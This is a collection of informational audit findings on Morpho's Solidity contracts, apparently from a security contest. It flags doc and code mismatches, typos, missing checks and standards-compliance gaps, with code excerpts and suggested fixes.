A minor spelling error in the comments related to the "guardian" functionality in the comments of `submitGuardian` function. While this issue does not pose a security risk, it is considered good practice to maintain correct spellings in code comments for clarity and consistency.

- **Vulnerability Details**

The spelling error is present in the comments associated with the "submitGuardian" function. The term "gardian" is used instead of the correct spelling, "guardian."

- **Impact**

This issue has no impact on the functionality or security of the code. It is a documentation-related matter that does not affect the runtime behavior of the smart contract.

- **Tools Used**

- Manual review

- **Recommendations**

It is recommended to correct the spelling error in the comments to maintain consistency and clarity in the codebase. While this is not a critical issue, adhering to proper spelling conventions enhances the readability of the code and prevents potential confusion among developers reviewing or maintaining the code in the future. The corrected comments should reflect the accurate spelling of "guardian."

It is important to note that this recommendation is non-critical, and addressing it is at the discretion of the development team.



### Confusing comment in `hasPermission()` function	_(duplicate of [Incorrect comment])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Recommendation**:

Remove `no` from description, because it returns true if account actually **has** permission.

https://github.com/morpho-org/erc20-permissioned/blob/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L49
```solidity
@>  /// @dev Returns true if `account` has no permission.
    /// @dev By default Morpho and Bundler have permission.
    /// @dev Override this function to change the permissioning scheme.
    function hasPermission(address account) public view virtual returns (bool) {
        return account == address(0) || account == MORPHO || account == BUNDLER;
    }
```



### Incorrect NatSpec in `submitMarketRemoval()`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:

In warning it says that submittion will overwrite `removableAt`, however function will revert in first line instead.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L307
```solidity
    /// @notice Submits a forced market removal from the vault, eventually losing all funds supplied to the market.
@>  /// @dev Warning: Submitting a forced removal will overwrite the timestamp at which the market will be removable.
    function submitMarketRemoval(Id id) external onlyCuratorRole {
@>      if (config[id].removableAt != 0) revert ErrorsLib.AlreadySet();
        if (!config[id].enabled) revert ErrorsLib.MarketNotEnabled();

        _setCap(id, 0);

        // Safe "unchecked" cast because timelock <= MAX_TIMELOCK.
        config[id].removableAt = uint64(block.timestamp + timelock);

        emit EventsLib.SubmitMarketRemoval(_msgSender(), id);
    }
```

**Recommendation**:

Remove dev Warning



### Outdated NatSpec in `updateWithdrawQueue`	_(duplicate of [Inaccurate assumptions for `updateWithdrawQueue`])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:

It talks about function `sortWithdrawQueue()`, however there is no such a function.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L339-L346
```solidity
    /// @notice Sets the withdraw queue as a permutation of the previous one, although markets with both zero cap and
    /// zero vault's supply can be removed from the permutation.
    /// @notice This is the only entry point to disable a market.
    /// @notice Removing a market requires the vault to have 0 supply on it; but anyone can supply on behalf of the
@>  /// vault so the call to `sortWithdrawQueue` can be griefed by a frontrun. To circumvent this, the allocator can
@>  /// simply bundle a reallocation that withdraws max from this market with a call to `sortWithdrawQueue`.
    /// @param indexes The indexes of each market in the previous withdraw queue, in the new withdraw queue's order.
    function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole 
```





### Informational Issue in Error Handling of function `_supplyMorpho`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity**
Informational

- **Relevant GitHub Links**
https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L813

- **Summary**
The `_supplyMorpho` function utilizes a try/catch block to manage potential reverts during the call to `MORPHO.supply`. While this is a valid approach, it's crucial to note that the catch section currently does not return any value for debugging purposes. Consider enhancing error transparency by returning relevant information in the catch section to aid in effective debugging.

- **Vulnerability Details**
While the try/catch approach is a valid means of managing potential errors, it's essential to consider the broader implications. Catching all errors might mask unforeseen issues, complicating debugging efforts.

- **Impact**
The impact is informational, and there is no immediate threat to the system. However, it could potentially hide unexpected issues, leading to challenges in diagnosing problems.

- **Tools used**
- Manual review

- **Recommendations**
Consider implementing a more targeted error-handling strategy that distinguishes between different types of errors. This approach can enhance the system's transparency and facilitate more effective debugging.




### Clarification Needed on Function Behavior

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


- **Severity**
Informational

- **Relevant GitHub Links**
https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L819

- **Summary**
The `_supplyMorpho` function, after the loop, reverts with `ErrorsLib.AllCapsReached()` if `assets` is still not zero. Clarification is needed to confirm if this behavior is intentional.

- **Vulnerability Details**
The function's behavior, if `assets` is non-zero after the loop, might be intended. However, a clear comment explaining this logic is essential to confirm that this outcome is desired.

- **Impact**
The impact is informational, and there is no immediate threat to the system. However, providing explicit documentation on this logic ensures clarity for developers and auditors.

- **Tools used**
- Manual review

- **Recommendations**
Add a clear comment in the code to explain the logic behind reverting with `ErrorsLib.AllCapsReached()` if `assets` is still non-zero after the loop. This documentation enhances code transparency and understanding.





### Typo in `Mininimum`

**Severity:** Informational

**Context:** [ConstantsLib.sol#L11-L11](morpho-blue-irm/src/libraries/adaptive-curve/ConstantsLib.sol#L11-L11)

Typo in `Mininimum`



### Convert ConstantsLib to Library for Improved Code Reusability and Organization

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity**
Informational

- **Relevant GitHub Links**
https://github.com/morpho-org/morpho-blue-bundlers/blob/3506b0e19ba78332cd85a95cf4226a79bf627d0f/src/libraries/ConstantsLib.sol#L5

- **Summary**
The `ConstantsLib.sol` defines a constant `UNSET_INITIATOR` to represent the default value of the initiator of a multicall transaction. The recommendation is to convert the `ConstantsLib.sol` file into a library to facilitate reuse across multiple contracts and enhance code organization.

- **Vulnerability Details**
No security vulnerabilities were identified during the manual review of the provided code.

- **Impact**
The current code serves its purpose of defining constants effectively. However, considering future developments and the potential need to add more constants or shared functionalities, converting the `ConstantsLib.sol` file into a library is suggested. 

- **Tools Used**
- Manual review

- **Recommendations**
The recommendation to convert `ConstantsLib.sol` into a library is based on the benefits of code reusability and enhanced organization. Libraries in Solidity are specifically designed for code that is intended to be reused across multiple contracts. 

Converting the constants into a library promotes a modular approach, making it easier to manage and maintain shared functionalities. This practice aligns with industry best practices and can contribute to a more sophisticated and maintainable codebase. 

By using a library, constants and shared functionalities can be centrally managed and updated, reducing redundancy and ensuring consistency across multiple contracts. This approach becomes particularly advantageous as the codebase expands and evolves.

In conclusion, while the existing code is sound and fulfills its immediate purpose, the recommendation for conversion into a library is forward-looking, considering potential future requirements and the desire for a more modular and reusable code structure.



### Wrong `utilization` if `totalSupplyAssets` is zero

**Severity:** Informational

**Context:** [AdaptiveCurveIrm.sol#L120-L120](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L120-L120)

**Description**: When a market has zero loan assets supplied, the IRM will use a utilization of `0` to compute the borrow rate. It will lead to an `error` of `-1` and the max `speed` for rate adjustments. Note that when the utilization is below the target utilization, `rateAtTarget` continuously shifts downwards. This is to incentivise borrowing by reducing the interest borrowers have to pay.
However, when the supply assets are 0, it means the suppliers are not incentivised enough to supply their assets, likely because the rate is too low (compared to the risk or opportunity cost). The problem is not with the borrowers in this special case. The rate should adjust upward to incentivise users to supply their assets. Instead, rates are further reduced in this case, making the situation even worse for suppliers which could lead to a cold-start problem for the market.

**Recommendation**: Consider using a utilization rate of `100%` in case there are no supply assets to increase the rate and incentivise suppliers to supply their assets to the platform.

```solidity
int256 utilization =
    int256(market.totalSupplyAssets > 0 ? market.totalBorrowAssets.wDivDown(market.totalSupplyAssets) : WAD);
```



### setting fee is not timelocked, violating trust assumption and not comply to the documentations	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:

According to the documentation, owner can change performance fee with timelock restriction : 

> [Timelocked with no possible veto] Set the performance fee (capped to 50%).

However, current implementation allow owner to change performance fee ignoring the configured timelock.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L233-L245

```solidity
    function setFee(uint256 newFee) external onlyOwner {
        if (newFee == fee) revert ErrorsLib.AlreadySet();
        if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
        if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();

        // Accrue interest using the previous fee set before changing it.
        _updateLastTotalAssets(_accrueFee());

        // Safe "unchecked" cast because newFee <= MAX_FEE.
        fee = uint96(newFee);

        emit EventsLib.SetFee(_msgSender(), fee);
    }
```

If user not agree with the new performance fee, they cannot react to the configuration change even though the timelock is already configured.

**Recommendation**:

Implement timelocked `setFee` according to the documentations.



### Incorrect documentation of `nativeTransfer()`

**Severity:** Informational

**Context:** [TransferBundler.sol#L25-L25](morpho-blue-bundlers/src/TransferBundler.sol#L25-L25)

**Description:**

The description of the `nativeTransfer()` function asserts that if the amount is passed as `type(uint256).max`, the initiator's balance will be transferred, as stated: "Pass `type(uint256).max` to transfer the initiator's balance." However, this description is inaccurate, as the transferred amount is constrained by the available balance in the bundler, as indicated by the line below:

```solidity
amount = Math.min(amount, address(this).balance);
```

In reality, the transferred amount will be the balance that is still left in the bundler, not the initiator's balance.

**Recommendation:**

To accurately reflect the functionality in the comment, it is recommended to update it to "Pass `type(uint256).max` to transfer the bundler's remaining balance." This adjustment aligns with the actual behavior of the `nativeTransfer()` function.



### Wrong comment about ERC20PermissionedBase.hasPermission	_(duplicate of [Incorrect comment])_

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L49-L54](erc20-permissioned/src/ERC20PermissionedBase.sol#L49-L54)

- Description
The first @dev comment about *ERC20PermissionedBase.hasPermission()* says it returns true if account has no permission. It's the opposite - true is returned if the account has permission.

- Recommendation
Change the comment: 
```diff
 -   /// @dev Returns true if `account` has no permission.
 +   /// @dev Returns true if `account` has permission.
```




### `MIN_TIMELOCK` should be 12 hours according to spec

**Severity:** Informational

**Context:** [README.md#L31-L31](metamorpho/README.md#L31-L31), [ConstantsLib.sol#L13-L13](metamorpho/src/libraries/ConstantsLib.sol#L13-L13)

**Description**: The specification in the README says the `MIN_TIMELOCK` should be 12 hours. In the code, it is set to 1 days. 

**Recommendation**: The code should implement the specification. Consider changing either the code or the specification.



### `setFee` is not time-locked

**Severity:** Informational

**Context:** [README.md#L51-L51](metamorpho/README.md#L51-L51), [MetaMorpho.sol#L242-L242](metamorpho/src/MetaMorpho.sol#L242-L242)

**Description**: The `setFee` function is currently not time-locked. It should be time-locked because:

1. The specification says the owner can change the fee only under a timelock: "[Timelocked with no possible veto] Set the performance fee (capped to 50%)."
2. Changing the fee has an impact on the users' interest rates earned. The APY could go down and users should be able to withdraw and allocate their money somewhere else with a better rate before this new fee becomes active.

**Recommendation**: Add a timelock to `setFee`.



### `submitMarketRemoval` will _not_ overwrite the the timestamp at which the market will be removable

**Severity:** Informational

**Context:** [MetaMorpho.sol#L307-L307](metamorpho/src/MetaMorpho.sol#L307-L307)

**Description**: The `submitMarketRemoval` natspec states that it will overwrite the timestamp at which the market will be removable. However, it contains the following code which prevents removing a market that is already scheduled to be removed:

```solidity
if (config[id].removableAt != 0) revert ErrorsLib.AlreadySet();
```

The impact is that market removals cannot be delayed through calling `submitMarketRemoval` twice.

**Recommendation**: Consider removing the comment or adjusting the code to match the comment.



### Non-forced market removals can be denied

**Severity:** Informational

**Context:** [MetaMorpho.sol#L370-L370](metamorpho/src/MetaMorpho.sol#L370-L370)

**Description**: The `updateWithdrawQueue` function removes markets once their supply cap is 0 and the supplied assets on behalf of the vault are 0. However, any user can deposit on behalf of the vault directly on Morpho Blue, circumventing any Metamorpho supply caps. The market removal will be rejected.

**Recommendation**: To circumvent this, the allocator can simply bundle a reallocation that withdraws max from this market with a call to `sortWithdrawQueue`. Alternatively, just remove it even if someone supplied assets as the `reallocate` does not check if a market is enabled for withdrawals.

> Note that the natspec talks about a similar exploit on a `sortWithdrawQueue` function but `sortWithdrawQueue` is clearly not `updateWithdrawQueue`



### Permit2Bundler - `transferFrom2()` will always transfer then entire account's balance if `amount` is larger than it

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
Permit2Bundler's `transferFrom2` will transfer the entire account's balance if it's less than the provided `amount`.
The NatSpec comment about `amount` states that `type(uint256).max` must be passed in order to transfer the entire balance, but in fact the function would behave the same even if the passed `amount` is just `1 wei` more than the initiator's balance.

This is a rather irregular behaviour when performing transfers and might lead to sub-par UX as users would expect to either transfer `100 tokens` (for example) or nothing, and not their balance of `95 tokens` in case they mistype `amount` or their balance gets/is lower than they expect it to be before calling `transferFrom2`.

```solidity
    /// @param amount The amount of `asset` to transfer from the initiator. Pass `type(uint256).max` to transfer the
	/// initiator's balance.
    function transferFrom2(address asset, uint256 amount) external payable protected {
        address _initiator = initiator();
→       amount = Math.min(amount, ERC20(asset).balanceOf(_initiator));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        Permit2Lib.PERMIT2.transferFrom(_initiator, address(this), amount.toUint160(), asset);
    }
```

- Recommended Mitigation Steps
Depending on how restrictive you want to be, I see 2 options:
1. Check if `amount` is equal to `type(uint256).max` instead of doing `min(amount, initiator balance)` directly, and only then set amount to the initiator's balance.
2. Revert if `amount` is < `ERC20(asset).balanceOf(_initiator)`




### ERC20PermissionedBase will only work for transfers between Morpho and a bundler

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description

Right now, only Morpho and a Bundler can mint/burn/transfer it between each other. An EOA that's not morpho or the bundler will not be able to mint/burn/transfer at all. Also it's not an abstract contract which speaks it's considered "ready to go" so it's recommended you mark it as `abstract`.




### `revokePendingMarketRemoval` missing from docs

**Severity:** Informational

**Context:** [MetaMorpho.sol#L478-L478](metamorpho/src/MetaMorpho.sol#L478-L478)

**Description:** The `revokePendingMarketRemoval` function is missing from docs. It should be under the curator or guardian role's permissions. It's currently unclear if it implements the spec.


**Recommendation:** Consider documenting that curators and guardians can call this function.



### Timelock Bypass by Setting to 0

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The contract's internal function `_setTimelock(uint256 newTimelock)` allows setting the `timelock` value to 0. This creates a vulnerability, as a 0 timelock effectively bypasses the intended time-based constraints, potentially impacting the security and functionality of the system.

https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L200

**Recommendation**:
Implement proper checks in the `_setTimelock` function to disallow setting the `timelock` to 0.



### Support for the push0 opcode	_(duplicate of [Solidity version can cause issues in L2s that do not support PUSH0 opcode])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
push0 is an instruction which pushes the constant value 0 onto the stack. This opcode is still not supported by many chains, like [Arbitrum](https://developer.arbitrum.io/solidity-support#Differences%20from%20Solidity%20on%20Ethereum) and might be problematic for projects compiled with a version of Solidity >= 0.8.20

https://github.com/morpho-org/erc20-permissioned/blob/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L2

**Recommendation**:
Use solidity 0.8.19 or lower



### `UniversalRewardsDistributor.sol` does not check reward token balance in contract before transfer

**Severity:** Informational

**Context:** [UniversalRewardsDistributor.sol#L133-L133](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L133-L133)

**Description**:

`UniversalRewardsDistributor.claim()` allows to pass the argument as `reward` which is reward token address to be transferred to recipient account address. It is possible that, `UniversalRewardsDistributor` contract does not have enough reward token balance to complete successful claim. It should be noted that the transaction would revert in such case due to insufficient balance but the user or claimer will have to go through all steps from L-119 to L-135 and then the transaction would revert. 

However, this can be made simpler by explicitely checking the contract balance for particular reward token being transferred so that the claimer/user would not have to feel inconvience or bad user experience and waste of gas usage from his own pocket.

**Recommendation**:

Recommend to check the contract balance for reward tokens before initiating transfer.



### Never used import 	_(duplicate of [Unnecessary Import of `PendingAddress` in EventsLib Library])_

**Severity:** Informational

**Context:** [EventsLib.sol#L6-L6](metamorpho/src/libraries/EventsLib.sol#L6-L6)

Never used import 



### Inconsistency in modifiers 	_(duplicate of [Non-Uniformly access to msg.sender in MetaMorpho modifiers])_

**Severity:** Informational

**Context:** [MetaMorpho.sol#L158-L158](metamorpho/src/MetaMorpho.sol#L158-L158), [MetaMorpho.sol#L165-L165](metamorpho/src/MetaMorpho.sol#L165-L165)

Inconsistency with previous modifiers - `_msgSender()` not cached in local variable `sender`. 



### Contracts using old version of openzeppelin contracts

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Description**:

Most of the contracts used in Morpho protocol has used openzeppelin v4.9.2 which is an old version. The openzeppelin version is verified from package.json. When external libraries like openzeppelin used in contracts then the security of such libraries holds paramount importance. Openzeppelin has recently released v5.0.0 which is touted to be secured as compared to old version and comes with better gas optimizations.

**Recommendation**:

Recommend to use latest version of openzeppelin library.



### Redundant check

**Severity:** Informational

**Context:** [ChainlinkOracle.sol#L72-L72](morpho-blue-oracles/src/ChainlinkOracle.sol#L72-L72)

**Description**:

The second require statement `require(vaultConversionSample != 0, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_ZERO);` is redundant and useless since `vaultConversionSample` has to be equal to 1 to pass the first check.

```solidity
        require(
            address(vault) != address(0) || vaultConversionSample == 1, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_NOT_ONE
        );
        require(vaultConversionSample != 0, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_ZERO);
```

**Recommendation**:

Delete the second require statement.

```diff
        require(
            address(vault) != address(0) || vaultConversionSample == 1, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_NOT_ONE
        );
-       require(vaultConversionSample != 0, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_ZERO);
```



### `owner` should be declared as a `view` function

**Severity:** Informational

**Context:** [IMetaMorpho.sol#L23-L23](metamorpho/src/interfaces/IMetaMorpho.sol#L23-L23)

**Description**:
The `owner` function should be marked as `view` since it is not updating state, and also to adhere to the signature declared in OpenZeppelin's `Ownable.sol`.

**Recommendation**:
Declare this as a View function by adding the `view` keyword to the signature



### totalAssets() call consumes a lot of gas when amount of pools is maxed

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**
When metamorpho uses the max amount of pulls, totalAssets() is a  >600k gas operation.
Integrations will have a hard time with those costs.


**Remediation**
Limit the max amounts of pools used or cache it



### MetaMorpho deposit/mint/withdraw/redeem functions should perform slippage checks as stated in EIP-4626

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:

[EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) standard states the following security consideration:

> If implementors intend to support EOA account access directly, they should consider adding an additional function call for deposit/mint/withdraw/redeem with the means to accommodate slippage loss or unexpected deposit/withdrawal limits, since they have no other means to revert the transaction if the exact output amount is not achieved.

**Recommendation**:

It is recommended to include slippage checks in the aforementioned functions to allow EOA to set the minimum amount of tokens/shares that they expect to receive by executing these functions.



### MetaMorpho withdraw/redeem functions are not fully compliant to EIP-4626

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:


[EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) standard states the following about `withdraw` and `redeem` functions:

> MUST support a withdraw flow where the shares are burned from owner directly where msg.sender has EIP-20 approval over the shares of owner.

> MUST support a redeem flow where the shares are burned from owner directly where msg.sender has EIP-20 approval over the shares of owner.


**Recommendation**:

Include a mechanism for authorized actors to withdraw/redeem assets on behalf of users to fully comply with EIP-4626.



### stale docs on owner access to `setSkimRecipient()`

**Severity:** Informational

**Context:** [MetaMorpho.sol#L204-L204](metamorpho/src/MetaMorpho.sol#L204-L204)

**Description**:

The documents does not mention owner access to `setSkimRecipient` function. Instead docs refers to `rewards recipient.` which is not used as function or variable name in contract. This may confuse users or reader while reading code. Therefore, docs should be inline with contracts.  

**Recommendation**:

Correct below line in documentation under roles of owner,

```diff

Do what the curator can do.
Do what the guardian can do.
Transfer or renounce the ownership.
Set the curator.
Set allocators.
- Set the rewards recipient.
+ Set the Skim Recipient
Increase the timelock.
[Timelocked] Decrease the timelock.
[Timelocked with no possible veto] Set the performance fee (capped to 50%).
[Timelocked] Set the guardian.
Set the fee recipient.
```




### Update `ChainlinkDataFeedLib.getDecimals` function to return `uint8`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

As the returned value of `feed.decimals()` is of `uint8` type; then update `ChainlinkDataFeedLib.getDecimals` function to return `uint8` instead of `uint256`.

- Context

[ChainlinkDataFeedLib.getDecimals function](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L31C1-L35C6)

```solidity
    function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 0;

        return feed.decimals();
    }
```

- Recommendation

```diff
-   function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) {
+   function getDecimals(AggregatorV3Interface feed) internal view returns (uint8) {
        if (address(feed) == address(0)) return 0;

        return feed.decimals();
    }
```




### `ERC20PermissionedBase._update` missing allowance check

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

- `ERC20PermissionedBase._update` function is intended to transfer a `value` of tokens from `from` address to `to` address directly without checking the allowance if the `from` is not the `msg.sender` by using the implemnted `ERC20._update` function which is shown below:

  ```solidity
      /**
      * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
      * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
      * this function.
      *
      * Emits a {Transfer} event.
      */
      function _update(address from, address to, uint256 value) internal virtual {
          if (from == address(0)) {
              // Overflow check required: The rest of the code assumes that totalSupply never overflows
              _totalSupply += value;
          } else {
              uint256 fromBalance = _balances[from];
              if (fromBalance < value) {
                  revert ERC20InsufficientBalance(from, fromBalance, value);
              }
              unchecked {
                  // Overflow not possible: value <= fromBalance <= totalSupply.
                  _balances[from] = fromBalance - value;
              }
          }

          if (to == address(0)) {
              unchecked {
                  // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                  _totalSupply -= value;
              }
          } else {
              unchecked {
                  // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                  _balances[to] += value;
              }
          }

          emit Transfer(from, to, value);
      }
  ```

- So when implementing this function; consider checking if the `msg.sender` is allowed to spend `from` tokens (`_allowances[from][msg.sender] >= value`) or if the `msg.sender == from`.

- Context

[ERC20PermissionedBase.\_update function](https://github.com/morpho-org/erc20-permissioned/blob/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L66C2-L71C6)

```solidity
   function _update(address from, address to, uint256 value) internal virtual override {
        if (!hasPermission(from)) revert NoPermission(from);
        if (!hasPermission(to)) revert NoPermission(to);

        super._update(from, to, value);
    }
```

- Recommendation

Update `_update` function as follows:

```diff
   function _update(address from, address to, uint256 value) internal virtual override {
        if (!hasPermission(from)) revert NoPermission(from);
        if (!hasPermission(to)) revert NoPermission(to);
+       if(msg.sender ! = from) require(_allowances[from][msg.sender] >= value,"not allowed");
        super._update(from, to, value);
    }
```




### `MetaMorpho` vault owner has the guardian role by default

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

- As per the documentation; the guardian role of the `MetaMorpho` vault can be granted to one actor only [(here)](https://github.com/morpho-org/metamorpho/blob/main/README.md#:~:text=vault%20is%20disabled.-,Guardian,Only%20one%20address%20can%20have%20this%20role.,-It%20can%3A):

  > Guardian
  > Only one address can have this role.

- But it was noticed that the vault owner is by default has the guardian role, as implemented in the `onlyGuardianRole` modifier:

```solidity
    modifier onlyGuardianRole() {
        if (_msgSender() != owner() && _msgSender() != guardian) revert ErrorsLib.NotGuardianRole();

        _;
    }
```

- Context

[MetaMorpho.onlyGuardianRole modifier](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L157C1-L161C6)

```solidity
    modifier onlyGuardianRole() {
        if (_msgSender() != owner() && _msgSender() != guardian) revert ErrorsLib.NotGuardianRole();

        _;
    }
```

- Recommendation

Either update the `onlyGuardianRole` modifier to allow `gurdian` only, or update the documentation to reflect the current implementation.




### `MetaMorpho.submitGuardian` function doesn't check for `address(0)`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

- The owner of the `MetaMorpho` vault can set the guardian of the vault by calling `submitGuardian` function; where it sets the guardian directly if the guardian hasn't been set before, or sets the pendingGuardian to be executed after the timelock period passes.

- But it was noted that there's no check if the newGurdian `!= address(0)` before assigning it.

- Context

[MetaMorpho.submitGuardian funcrion](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L265C1-L279C6)

```solidity
    function submitGuardian(address newGuardian) external onlyOwner {
        if (newGuardian == guardian) revert ErrorsLib.AlreadySet();

        if (guardian == address(0)) {
            _setGuardian(newGuardian);
        } else {
            if (pendingGuardian.validAt != 0 && newGuardian == pendingGuardian.value) {
                revert ErrorsLib.AlreadyPending();
            }

            pendingGuardian.update(newGuardian, timelock);

            emit EventsLib.SubmitGuardian(newGuardian);
        }
    }
```

- Recommendation

In `submitGuardian` function: check that `newGuardian != address(0)` before assigning it.



### `MetaMorpho.submitCap` : use `marketParams` that's fetched from the `metamorpho` contract instead of relying on human input

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

- `MetaMorpho.submitCap` function is intended to be accessed by the vault curator to set the cap of any market, and it depends on the curator input for `marketParams`.

- Then based on the `marketParams` input : the market id & market loanToken are extracted from the input; then a call is made to the `MORPHO` contract to check if the market exists.

- The design of this function can be enhanced by letting the curator input the market id only; then the marketParams are extracted from the `MORPHO` contract; this will remove the redundant check on the market existence (as shown in the mitigation below).

- Context

[MetaMorpho.submitCap function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L286C2-L304C6)

```solidity
   function submitCap(MarketParams memory marketParams, uint256 newSupplyCap) external onlyCuratorRole {
        Id id = marketParams.id();
        if (marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
        if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();

        uint256 supplyCap = config[id].cap;
        if (newSupplyCap == supplyCap) revert ErrorsLib.AlreadySet();

        if (newSupplyCap < supplyCap) {
            _setCap(id, newSupplyCap.toUint184());
        } else {
            // newSupplyCap > supplyCap >= 0 so there's no need to check `pendingCap[id].validAt != 0`.
            if (newSupplyCap == pendingCap[id].value) revert ErrorsLib.AlreadyPending();

            pendingCap[id].update(newSupplyCap.toUint184(), timelock);

            emit EventsLib.SubmitCap(_msgSender(), id, newSupplyCap);
        }
    }
```

- Recommendation

```diff
-  function submitCap(MarketParams memory marketParams, uint256 newSupplyCap) external onlyCuratorRole {
+  function submitCap(Id id, uint256 newSupplyCap) external onlyCuratorRole {
-       Id id = marketParams.id();
+       MarketParams memory marketParams=MORPHO.idToMarketParams(id);
        if (marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
-       if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();

        uint256 supplyCap = config[id].cap;
        if (newSupplyCap == supplyCap) revert ErrorsLib.AlreadySet();

        if (newSupplyCap < supplyCap) {
            _setCap(id, newSupplyCap.toUint184());
        } else {
            // newSupplyCap > supplyCap >= 0 so there's no need to check `pendingCap[id].validAt != 0`.
            if (newSupplyCap == pendingCap[id].value) revert ErrorsLib.AlreadyPending();

            pendingCap[id].update(newSupplyCap.toUint184(), timelock);

            emit EventsLib.SubmitCap(_msgSender(), id, newSupplyCap);
        }
    }
```



### `MetaMorpho` contract: avoid using `owner` to name functions parameters

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Details

Some functions `MetaMorpho` contract uses `owner` to name its parameters; while as known the `owner` must refer to the vault owner, and this might cause confusion when using these functions.

- Context

[MetaMorpho.maxWithdraw function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L545C3-L545C88)

```solidity
  function maxWithdraw(address owner) public view override returns (uint256 assets) {
```

[MetaMorpho.maxRedeem function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L552C4-L552C79)

```solidity
 function maxRedeem(address owner) public view override returns (uint256) {
```

[MetaMorpho.withdraw function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585C5-L585C114)

```solidity
function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
```

[MetaMorpho.redeem function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599C4-L599C112)

```solidity
 function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {
```

[MetaMorpho.\_maxWithdraw function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L628C5-L628C41)

```solidity
function _maxWithdraw(address owner)
```

[MetaMorpho.\_withdraw function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L711C5-L711C104)

```solidity
function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
```

- Recommendation

Use `depositOwner` or `_owner` or any other naming for naming functions parameters rather than using `owner` as it might be confused with the `owner` variable which refers to the vault's owner.




### `metamorpho/libraries/ConstantsLib` library: contradiction between `MIN_TIMELOCK` and the documentation value	_(duplicate of [`MIN_TIMELOCK` should be 12 hours according to spec])_

**Severity:** Informational

